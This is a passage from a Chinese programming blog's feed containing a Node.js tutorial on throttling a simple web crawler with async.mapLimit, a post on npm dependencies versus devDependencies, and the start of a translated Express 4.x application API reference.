class="keyword">var</span> concurreyCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fetchUrl = <span class="function"><span class="keyword">function</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// delay 的值在 2000 以内，是个随机的整数 模拟延时</span></span><br><span class="line">    <span class="keyword">var</span> delay =  <span class="built_in">parseInt</span>((<span class="built_in">Math</span>.random()* <span class="number">10000000</span>) % <span class="number">2000</span>,<span class="number">10</span>);</span><br><span class="line">    concurreyCount++;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'现在并发数是 '</span> , concurreyCount , <span class="string">' 正在抓取的是'</span> , url , <span class="string">' 耗时'</span> + delay + <span class="string">'毫秒'</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        concurreyCount--;</span><br><span class="line">        callback(<span class="literal">null</span>,url + <span class="string">' html content'</span>);</span><br><span class="line">    &#125;,delay);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> urls = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">    urls.push(<span class="string">'http://datasource_'</span> + i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们使用<code>async.mapLimit</code>来并发抓取，并获取结果。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.mapLimit(urls,<span class="number">5</span>,<span class="function"><span class="keyword">function</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">    fetchUrl(url,callbcak);</span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,result</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'result: '</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>模拟摘自<a href="https://github.com/alsotang/node-lessons/tree/master/lesson5" target="_blank" rel="noopener">alsotang</a></p><p>运行输出后得到以下结果</p><p><img src="http://www.chenqaq.com/assets/images/concurrency1.png" alt=""></p><p>我们发现，并发数从1开始增长，但是增长到5时，就不在增加。然有任务时就继续抓取，并发连接数量始终控制在5个。</p><h1 id="完成node简易爬虫系统"><a href="#完成node简易爬虫系统" class="headerlink" title="完成node简易爬虫系统"></a>完成node简易爬虫系统</h1><p>因为alsotang前辈的<a href="https://github.com/alsotang/node-lessons" target="_blank" rel="noopener">《node包教不包会》</a>教程例子中使用的eventproxy控制的并发数量，我们就来完成一个使用async控制并发数量的node简易爬虫。</p><p>爬取的目标就是<a href="http://www.chenqaq.com" target="_blank" rel="noopener">本站首页</a>（手动护脸）</p><p>第一步，首先我们需要用到以下的模块：</p><ul><li>url ： 用于url解析，这里用到<code>url.resolve()</code>生成一个合法的域名</li><li>async ： 一个实用的模块，提供了强大的功能和异步JavaScript工作</li><li>cheerio ： 为服务器特别定制的，快速，灵活，实施的jQuery核心实现</li><li>superagent ： nodejs里一个非常方便的客户端请求代理模块<!--  -->通过<code>npm</code>安装依赖模块</li></ul><p><img src="http://www.chenqaq.com/assets/images/concurrency2.png" alt=""></p><p>第二步，通过require引入依赖模块，确定爬取对象URL：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">async</span> = <span class="built_in">require</span>(<span class="string">"async"</span>);</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">"cheerio"</span>);</span><br><span class="line"><span class="keyword">var</span> superagent = <span class="built_in">require</span>(<span class="string">"superagent"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">'http://www.chenqaq.com'</span>;</span><br></pre></td></tr></table></figure></p><p>第三步：使用superagent请求目标URL，并使用cheerio处理baseUrl得到目标内容url，并保存在数组arr中<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">superagent.get(baseUrl)</span><br><span class="line">  .end(<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">var</span> $ = cheerio.load(res.text);</span><br><span class="line">    <span class="comment">// 下面和jQuery操作是一样一样的..</span></span><br><span class="line">    $(<span class="string">".post-list .post-title-link"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">idx, element</span>) </span>&#123;</span><br><span class="line">      $element = $(element);</span><br><span class="line">      <span class="keyword">var</span> _url = url.resolve(baseUrl, $element.attr(<span class="string">"href"</span>));</span><br><span class="line">      arr.push(_url);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证得到的所有文章链接集合</span></span><br><span class="line">    output(arr);</span><br><span class="line">    <span class="comment">// 第四步：接下来遍历arr，解析每一个页面需要的信息</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>我们需要一个函数验证抓取的url对象，很简单我们只需要一个函数遍历arr并打印出来就可以：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第四步：我们需要遍历得到的URL对象，解析每一个页面需要的信息。</p><p>这里就需要用到<code>async</code>控制并发数量，如果你上一步获取了一个庞大的arr数组，有多个url需要请求，如果同时发出多个请求，一些网站就可能会把你的行为当做恶意请求而封掉你的ip</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.mapLimit(arr,<span class="number">3</span>,<span class="function"><span class="keyword">function</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">    superagent.get(url)</span><br><span class="line">        .end(<span class="function"><span class="keyword">function</span>(<span class="params">err,mes</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.error(err);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'message info '</span> + <span class="built_in">JSON</span>.stringify(mes));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'「fetch」'</span> + url + <span class="string">' successful！'</span>);</span><br><span class="line">            <span class="keyword">var</span> $ = cheerio.load(mes.text);</span><br><span class="line">            <span class="keyword">var</span> jsonData = &#123;</span><br><span class="line">                title:$(<span class="string">'.post-card-title'</span>).text().trim(),</span><br><span class="line">                href: url,</span><br><span class="line">            &#125;;</span><br><span class="line">            callback(<span class="literal">null</span>,jsonData);</span><br><span class="line">        &#125;,<span class="function"><span class="keyword">function</span>(<span class="params">error,results</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'results '</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(results);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>得到上一步保存url地址的数组arr，限制最大并发数量为3，然后用一个回调函数处理 「该回调函数比较特殊，在iteratee方法中一定要调用该回调函数，有三种方式」</p><ul><li><code>callback(null)</code> 调用成功</li><li><code>callback(null，data)</code> 调用成功，并且返回数据data追加到results</li><li><code>callback(data)</code> 调用失败，不会再继续循环，直接到最后的callback</li></ul><p>好了，到这里我们的node简易的小爬虫就完成了，来看看效果吧</p><p><img src="http://www.chenqaq.com/assets/images/concurrency3.png" alt=""></p><p>嗨呀，首页数据好少，但是成功了呢。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://github.com/alsotang/node-lessons" target="_blank" rel="noopener">Node.js 包教不包会 - alsotang</a></p><p><a href="https://github.com/JacksonTian/eventproxy" target="_blank" rel="noopener">enterproxy</a></p><p><a href="https://github.com/caolan/async" target="_blank" rel="noopener">async</a></p><p><a href="https://caolan.github.io/async" target="_blank" rel="noopener">async Documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> 并发，并行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dependencies和devDependencies的正确使用姿势</title>
      <link href="/2017/12/29/dependencies-devDependencies/"/>
      <url>/2017/12/29/dependencies-devDependencies/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>刀耕火种的时代已经过去，前端开发急需自动化，工程化。</p><p>有一天，你找到公司新人程序员小T和小F，给他们每个人分配了一个任务。小T和小F微笑的答应了，确定了项目的选型和结构，小T和小F准备安装依赖的模块。但是他们开始对于dependencies和devDependencies并没有那么在意：<br><a id="more"></a><br>程序员小T把所有的依赖模块都使用 <code>npm install --save</code>，将依赖安装在项目中，并写入了package.json的<code>dependencies</code>(生产环境)，最终导致项目臃肿不堪，前端是对性能的狂热追求者，最终小T的项目没有通过测试。 </p><p>程序员小F把所有的依赖模块使用<code>npm install --save-dev</code>,将依赖安装在项目中，并写入了package.json中的<code>devDependencies</code>(本地开发环境)，最终导致正常运行该项目使用了哪些依赖模块无从得知，预想后期会带来很多麻烦，导致小F的项目也没有通过测试</p><h1 id="安装依赖的三种方式"><a href="#安装依赖的三种方式" class="headerlink" title="安装依赖的三种方式"></a>安装依赖的三种方式</h1><p>小T和小F有些疑惑，项目本地明明正常，为什么都没有通过测试呢？他们决定弄个明白..</p><p>于是小T问，小F “你是怎么安装依赖的呀？” 小F：“我是使用<code>npm install --save-dev</code>安装依赖模块”，“哦，是这样呀，我是用npm install –save安装的模块”，小T答到。</p><ul><li>npm install </li><li>npm install –save</li><li>npm install –save-dev</li></ul><p>使用<code>npm install</code>将依赖模块安装到项目，但不写package.json（不推荐，这样最终需要手动添加）；使用<code>npm install --save</code>将模块安装到项目，写入的package.json的<code>dependencies</code>中；使用<code>npm install --save-dev</code>将模块安装到本地，写入package.json的<code>devDependencies</code>中。</p><p><img src="http://www.chenqaq.com/assets/images/dev1.png" alt="开发环境生产环境"></p><p>小T恍然大悟，原来是这样呀。那么前端工程化中的<code>开发环境</code>和<code>生产环境</code>到底有怎么样的区别呢？</p><h1 id="正确使用姿势"><a href="#正确使用姿势" class="headerlink" title="正确使用姿势"></a>正确使用姿势</h1><p>那么我们如何知道哪些是在生产环境中需要，哪些是在开发环境中需要呢?</p><p>生产环境只需要我们能正常运行该项目所需要的模块， 比如vue，vue-router，express，jQuery等等这些，项目没有这些依赖会出错</p><p>开发环境就是开发阶段，我们所做的单元测试，webpack，gulp，supervisor等这些工具，都只是在开发阶段需要，一旦项目投入需要便不再需要。</p><p>使用npm install 默认安装dependencies和devDependencies中的模块，如果只需要安装生产环境中的模块使用npm install -production</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>原来devDependencies里面的模块只用于开发环境，不用于生产环境，而 dependencies 是需要发布到生产环境的。那究竟有什么区别呢？工程化为什么需要这两个环境？</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>devDependencies中dev是develop的缩写，表示开发环境，即指开发阶段，对于一些仅在开发阶段需要的模块，项目正式投入后便不再需要的模块,我们选择把它们安装在<code>devDependencies</code>.</p><p>前端开发越来越体现工程化改革的姿态，无论是使用工具的进化，还是框架的更新迭代，前端对性能狂热追求伴随着工程化的进步也在不断提高，必然导致开发环境的多种多样，不可避免的导致开发环境的臃肿</p><h2 id="生产环境"><a href="#生产环境" class="headerlink" title="生产环境"></a>生产环境</h2><p>生产环境也就是真是真实环境,是线上用户接触的产生环境,因为开发环境的臃肿，不能直接用于生产环境，我们需要对环境可以优化的部分进行优化。</p><h2 id="判断是开发环境还是生产环境"><a href="#判断是开发环境还是生产环境" class="headerlink" title="判断是开发环境还是生产环境"></a>判断是开发环境还是生产环境</h2><ul><li>使用req.app.get(‘env’)</li></ul><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="string">'env'</span>) === <span class="string">'development'</span> ? err : &#123;&#125;;</span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="number">500</span>);</span><br><span class="line">  res.render(<span class="string">'error'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><img src="http://www.chenqaq.com/assets/images/env2.png" alt="req.app.get(&#39;env&#39;)"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.qdfuns.com/notes/25650/cb89922bcb597ca2cd13d5e61b180358.html" target="_blank" rel="noopener">qdfuns notes</a></p><p><a href="https://docs.npmjs.com/files/package.json" target="_blank" rel="noopener">npm package.json</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> 前端环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (一)：application (译)</title>
      <link href="/2017/12/24/express-api-cn-application/"/>
      <url>/2017/12/24/express-api-cn-application/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a></li></ul><p>技术库更迭较快，很难使译文和官方的API保持同步，更何况更多的大神看英文和中文一样的流畅，不会花时间去翻译–，所以我们看到<a href="http://www.expressjs.com.cn" target="_blank" rel="noopener">express中文网</a>更多的还是英文，我们只有提升自己的英语能力才能更快的适应库的更新迭代,阅读到最新资料.<br>所以我此次翻译的目的，一是熟悉express文档，二是锻炼自己英语阅读能力；</p><blockquote><p>原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">express.com</a><br><a id="more"></a></p></blockquote><h1 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h1><p>app对象是指一个Express应用程序，通过调用的顶层的express()函数创造它<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p><p>app对象有以下这些方法</p><ul><li>路由HTTP请求；例如：app.METHOD和app.param</li><li>配置中间件；例如：app.router</li><li>渲染HTML视图；例如：app.render</li><li>注册模板引擎；例如：app.engine</li></ul><p>他还具有影响应用程序行为的设置(属性)；获得更多的信息，见<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">Application settings</a></p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="app-locals"><a href="#app-locals" class="headerlink" title="app.locals"></a>app.locals</h3><p>app.locals是一个JavaScript对象，它的属性是应用程序中的局部变量<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.locals.title  <span class="comment">// "My App"</span></span><br><span class="line"></span><br><span class="line">app.locals.email  <span class="comment">// "me@myapp.com"</span></span><br></pre></td></tr></table></figure></p><p>一旦设置，<code>app.locals</code>属性的值将会贯穿整个生命周期。对比<code>res.locals</code>属性的特性，<code>res.locals</code>仅适用于请求的生命周期</p><p>你可以访问应用程序中呈现的模板中的本地变量，这对于想模板提供协助函数以及<code>app-level</code>非常有用。但是请注意，您不能访问中间件的局部变量<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.locals.title = <span class="string">"My App"</span>;</span><br><span class="line">app.locals.strftime = <span class="built_in">require</span>(<span class="string">'strftime'</span>);</span><br><span class="line">app.locals.email = <span class="string">'me@myapp.com'</span>;</span><br></pre></td></tr></table></figure></p><h3 id="app-mountpath"><a href="#app-mountpath" class="headerlink" title="app.mountpath"></a>app.mountpath</h3><p>app.mountpath属性是路径模式的子应用程序安装</p><blockquote><p>子应用程序是一个Express实例，可以用于处理对路由的请求<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();  <span class="comment">// 主要的应用程序</span></span><br><span class="line"><span class="keyword">var</span> admin = express();  <span class="comment">// 子应用程序</span></span><br><span class="line"></span><br><span class="line">admin.get(<span class="string">'/'</span>，<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(admin.mountpath)  <span class="comment">// admin</span></span><br><span class="line">    res.send(<span class="string">'Admin Homepage'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/admin'</span>,admin) <span class="comment">// 挂载子应用程序</span></span><br></pre></td></tr></table></figure></p></blockquote><p>这类似于req对象中的<code>baseUrl</code>属性，除了<code>baseUrl</code>返回匹配的URL路径，而不是匹配的模式(s).</p><p>如果子应用程序挂载在多个路径模式上，<code>app.mountpath</code>返回它挂载的模式列表，像下面所展示的例子这样：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> admin = express();</span><br><span class="line"></span><br><span class="line">admin.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(admin.mountpath)   <span class="comment">// [ '/adm*n','/manager' ]</span></span><br><span class="line">    res.send(<span class="string">'Admin Homepage'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret = express();</span><br><span class="line">secret.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(secret.mountpath); <span class="comment">//secr*t</span></span><br><span class="line">    res.send(<span class="string">'Admin Secret'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">admin.use(<span class="string">'/secr*t'</span>, secret); </span><br><span class="line">app.use([<span class="string">'/adm*n'</span>, <span class="string">'/manager'</span>], admin);</span><br></pre></td></tr></table></figure></p><h2 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h2><h3 id="app-on-‘mount’-callback-parent"><a href="#app-on-‘mount’-callback-parent" class="headerlink" title="app.on(‘mount’,callback(parent))"></a>app.on(‘mount’,callback(parent))</h3><p>当子程序被挂载到父程序时，mount事件被发射。父程序对象作为参数，传递给回调方法。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> admin = express();</span><br><span class="line"></span><br><span class="line">admin.on(<span class="string">'mount'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">parent</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Admin Mount'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(parent);   <span class="comment">// 指父应用程序</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">admin.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'Admin homePage'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/admin'</span>,admin);</span><br></pre></td></tr></table></figure></p><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="app-all-path-callback-callback-…"><a href="#app-all-path-callback-callback-…" class="headerlink" title="app.all(path,callback[,callback …])"></a>app.all(path,callback[,callback …])</h3><p>app.all方法和标准的app.METHOD()方法类似，除了它匹配所有的HTTP动词。对于给一个特殊前缀映射一个全局的逻辑处理，或者无条件匹配，它是很有效的。例如，如果你把下面内容放在所有其他的路由定义的前面，它要求所有从这个点开始的路由需要认证和自动加载一个用户。这些回调并不一定是终点：<code>loadUser</code>可以在完成了上一个任务后，调用<code>next()</code>来继续匹配随后的路由。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">'*'</span>,requireAuthentication,loadUser)</span><br></pre></td></tr></table></figure></p><p>或者这种相等的形式：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">'*'</span>,requireAuthentication);</span><br><span class="line">app.all(<span class="string">'*'</span>,loadUser)</span><br></pre></td></tr></table></figure></p><p>另一个例子是全局白名单的方法（white-listed “global” functionality）。这个例子和前面很像，然而它只是限制以/api开头的路径。<br><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">app.<span class="keyword">all</span>(<span class="string">'/api/*'</span>,requireAuthentication);</span><br></pre></td></tr></table></figure></p><h3 id="app-delete-path-callback-callback-…"><a href="#app-delete-path-callback-callback-…" class="headerlink" title="app.delete(path, callback [, callback …])"></a>app.delete(path, callback [, callback …])</h3><p>路由HTTP DELETE请求到有特殊回调方法的特殊的路径。获取更多的信息，可以查阅<a href="http://www.expressjs.com.cn/guide/routing.html" target="_blank" rel="noopener">routing guide</a></p><p>你可以提供多个回调函数，他们的作用和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果不能满足当前路由的处理条件，那么你可以传递控制到随后的路由。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.delete(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'DELETE request to homepage'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="app-disable-name"><a href="#app-disable-name" class="headerlink" title="app.disable(name)"></a>app.disable(name)</h3><p>将设置名为name的值为false，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。调用app.set(‘foo’,false)和app.disable(‘foo’)是等价的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.disable(<span class="string">'trust proxy'</span>);</span><br><span class="line">app.get(<span class="string">'trust proxy'</span>);   <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p><h3 id="app-disabled-name"><a href="#app-disabled-name" class="headerlink" title="app.disabled(name)"></a>app.disabled(name)</h3><p>如果<code>name</code>被禁用则返回true，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.disabled(<span class="string">'trust proxy'</span>);  <span class="comment">// true</span></span><br><span class="line">app.enable(<span class="string">'trust proxy'</span>);</span><br><span class="line">app.disabled(<span class="string">'trust proxy'</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p><h3 id="app-enable-name"><a href="#app-enable-name" class="headerlink" title="app.enable(name)"></a>app.enable(name)</h3><p>设置布尔类型的设置值name为true，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。调用app.set(‘foo’, true)和调用app.enable(‘foo’)是等价的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.enable(<span class="string">'trust proxy'</span>);</span><br><span class="line">app.get(<span class="string">'trust proxy'</span>)  <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="app-enabled-name"><a href="#app-enabled-name" class="headerlink" title="app.enabled(name)"></a>app.enabled(name)</h3><p>如果<code>name</code>可用则返回true，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.enabled(<span class="string">'trust proxy'</span>)   <span class="comment">// false</span></span><br><span class="line">app.enable(<span class="string">'trust proxy'</span>)   </span><br><span class="line">app.enabled(<span class="string">'trust proxy'</span>)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="app-engine-ext-callback"><a href="#app-engine-ext-callback" class="headerlink" title="app.engine(ext,callback)"></a>app.engine(ext,callback)</h3><p>注册给定引擎的回调，用来渲染ext文件。默认情况下，Express需要使用require()来加载基于文件扩展的引擎。例如，如果你尝试渲染一个<code>foo.jade</code>文件，Express在内部调用下面内容，同时缓存<code>require()</code>结果供随后来调用去提高性能<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.engine(<span class="string">'jade'</span>,<span class="built_in">require</span>(<span class="string">'jade'</span>).__express);</span><br></pre></td></tr></table></figure></p><p>使用下面这种方法，来处理没有办法开箱即用的.express方法的模板，或者你希望使用不同的扩展名。</p><p>举个栗子，使用ejs模板引擎来渲染.html文件：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.engine(<span class="string">'html'</span>,<span class="built_in">require</span>(<span class="string">'ejs'</span>).renderFile);</span><br></pre></td></tr></table></figure></p><p>在这个例子中，ejs提供了一个<code>.renderFile</code>方法，这个方法满足了Express规定的签名规则：(path, options, callback)，然而记住在内部它只是<code>ejs.__express</code>的一个别名，所以你可以在不做任何事的情况下直接使用.ejs扩展。一些模板引擎没有遵循这种规范，<code>consolidate.js</code>库映射模板引擎以下面的使用方式，所以他们可以无缝的和Express工作。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> engines = <span class="built_in">require</span>(<span class="string">'consolidate'</span>);</span><br><span class="line">app.engine(<span class="string">'haml'</span>,engines.haml);</span><br><span class="line">app.engine(<span class="string">'html'</span>,engines.hogan);</span><br></pre></td></tr></table></figure></p><h3 id="app-get-name"><a href="#app-get-name" class="headerlink" title="app.get(name)"></a>app.get(name)</h3><p>获得设置名为name的app设置的值，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。 如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'title'</span>);  <span class="comment">// =&gt; undefined</span></span><br><span class="line">app.set(<span class="string">'title'</span>,<span class="string">'My site'</span>);</span><br><span class="line">app.get(<span class="string">'title'</span>)  <span class="comment">// 'My site'</span></span><br></pre></td></tr></table></figure></p><h3 id="app-get-path-callback-callback-…"><a href="#app-get-path-callback-callback-…" class="headerlink" title="app.get(path, callback [, callback …])"></a>app.get(path, callback [, callback …])</h3><p>使用指定的回调函数将HTTP请求路由到指定的路径。获取跟多的信息，可以查阅<a href="http://expressjs.com/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。你可以提供多个回调函数，他们的内容和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没能满足当前路由的处理条件，那么传递控制到随后的路由。<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">app.<span class="built_in">get</span>(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="title">req</span>,<span class="title">res</span>)&#123;</span></span><br><span class="line">    res.<span class="built_in">send</span>(<span class="string">'GET request to homepage'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="app-listen-port-hostname-backlog-callback"><a href="#app-listen-port-hostname-backlog-callback" class="headerlink" title="app.listen(port, [hostname], [backlog], [callback])"></a>app.listen(port, [hostname], [backlog], [callback])</h3><p>绑定程序监听端口到指定的<code>主机</code>和<code>端口号</code>。这个方法和Node中的<a href="http://nodejs.org/api/http.html#http_server_listen_port_hostname_backlog_callback" target="_blank" rel="noopener">http.Server.listen()</a>是一样的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p><p>通过调用express()返回得到的app实际上是一个JavaScript的Function，被设计用来作为一个回调传递给<code>NODE HTTP servers</code>来处理请求。这样，其就可以很简单的基于同一份代码提供的http和https版本，所以app没有从这些继承（它只是一个简单的回调）。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> https = <span 